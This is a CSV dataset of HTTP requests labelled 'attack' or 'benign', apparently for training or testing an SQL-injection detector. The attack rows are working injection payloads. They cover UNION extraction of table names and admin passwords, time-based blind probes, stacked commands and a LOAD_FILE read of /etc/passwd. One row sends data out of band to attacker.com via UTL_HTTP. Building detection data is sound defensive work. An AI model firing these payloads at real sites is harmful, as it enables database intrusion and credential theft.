payload,label
GET http://<HOST>/<PATH>?id=1 AND LOAD_FILE(0x2F6574632F706173737764)--,attack
GET http://<HOST>/<PATH>?map=satellite&zoom=15&overlay=traffic,benign
"GET http://<HOST>/<PATH>?id=1') UNION SELECT NULL,NULL,NULL--",attack
POST http://<HOST>/<PATH>?address=Jl+Soekarno+Hatta&no=12&kota=Malang,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--,attack
GET http://<HOST>/<PATH>?profile=public&show_email=false&tab=bio,benign
"GET http://<HOST>/<PATH>?id=1' RLIKE SLEEP(5)--",attack
GET http://<HOST>/<PATH>?search=machine+learning&type=video&duration=short,benign
GET http://<HOST>/<PATH>?id=1;EXEC sp_configure 'show advanced options',1--,attack
GET http://<HOST>/<PATH>?promo=flashsale&source=email&cid=cx991,benign
"GET http://<HOST>/<PATH>?id=1' GROUP BY CONCAT(0x7e,0x27,Hex(RAND(0)),0x27,0x7e) HAVING MIN(0)#",attack
GET http://<HOST>/<PATH>?book_id=TZ2241&chapter=5&format=epub,benign
GET http://<HOST>/<PATH>?id=1 AND 2=2 UNION SELECT table_name,NULL FROM information_schema.tables--,attack
POST http://<HOST>/<PATH>?upload_id=ul88231&type=image%2Fpng&size=204800,benign
"GET http://<HOST>/<PATH>?id=1' AND IF(1=1,SLEEP(3),0)--",attack
GET http://<HOST>/<PATH>?color_scheme=auto&font=sans&size=16,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT schema_name FROM information_schema.schemata--,attack
GET http://<HOST>/<PATH>?news_id=77123&source=reuters&region=asia,benign
"GET http://<HOST>/<PATH>?id=1';DECLARE @q NVARCHAR(4000);SET @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",attack
POST http://<HOST>/<PATH>?notify=true&channel=email&freq=daily,benign
GET http://<HOST>/<PATH>?id=1 AND 1=(SELECT COUNT(*) FROM tabname)--,attack
GET http://<HOST>/<PATH>?version=beta&build=20240601&platform=web,benign
"GET http://<HOST>/<PATH>?id=1' OR IF(1=1,BENCHMARK(1000000,MD5(1)),1)=1--",attack
GET http://<HOST>/<PATH>?period=Q2&metric=ctr&breakdown=device,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,attack
GET http://<HOST>/<PATH>?path=home%2Fdashboard&nav=sidebar,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT 2147483648)>1--",attack
GET http://<HOST>/<PATH>?tier=premium&trial=false&seats=5,benign
GET http://<HOST>/<PATH>?id=1 AND ROWNUM=1 UNION SELECT username FROM all_users--,attack
POST http://<HOST>/<PATH>?shipment=SHP-8821&carrier=jne&status=in_transit,benign
"GET http://<HOST>/<PATH>?id=1' AND MAKE_SET(5672=5672,SLEEP(5))--",attack
GET http://<HOST>/<PATH>?stream=live&channel=news24&quality=720p,benign
GET http://<HOST>/<PATH>?id=1 OR 1 GROUP BY CONCAT(version(),floor(rand(0)*2)) HAVING MIN(0)--,attack
GET http://<HOST>/<PATH>?uid=cx77231&referral=invite&bonus=10,benign
"GET http://<HOST>/<PATH>?id=1') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e))s),8446744073709551610,8446744073709551610)))-- ZaLV",attack
GET http://<HOST>/<PATH>?area=south&district=lowokwaru&type=residential,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT TOP 1 name FROM sysobjects)>'a'--,attack
POST http://<HOST>/<PATH>?template=invoice&lang=id&export=pdf,benign
"GET http://<HOST>/<PATH>?id=1'||(SELECT 0x6b646c6a FROM DUAL WHERE 6401=6401 AND SLEEP(5))||'",attack
GET http://<HOST>/<PATH>?dashboard=sales&widget=pie&range=30d,benign
GET http://<HOST>/<PATH>?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),5)=1--,attack
GET http://<HOST>/<PATH>?semester=odd&year=2024&faculty=engineering,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT * FROM (SELECT(SLEEP(3)))YYYY) AND 'ZZzz'='ZZzz",attack
GET http://<HOST>/<PATH>?module=reports&subtype=weekly&export=csv,benign
GET http://<HOST>/<PATH>?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,@@version--,attack
GET http://<HOST>/<PATH>?notification=true&sound=off&vibrate=on,benign
"GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 FROM dual WHERE 1=1 AND 1=UTL_HTTP.REQUEST('http://attacker.com'))--",attack
GET http://<HOST>/<PATH>?term=2024s2&class=CS301&type=exam,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT 1,2,3,password FROM admin--,attack
POST http://<HOST>/<PATH>?room=101&checkin=2024-07-01&checkout=2024-07-05,benign
"GET http://<HOST>/<PATH>?id=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",attack
GET http://<HOST>/<PATH>?route=SUB1&stop=14&dir=inbound,benign
GET http://<HOST>/<PATH>?id=1;SELECT * INTO OUTFILE '/tmp/out.txt' FROM users--,attack
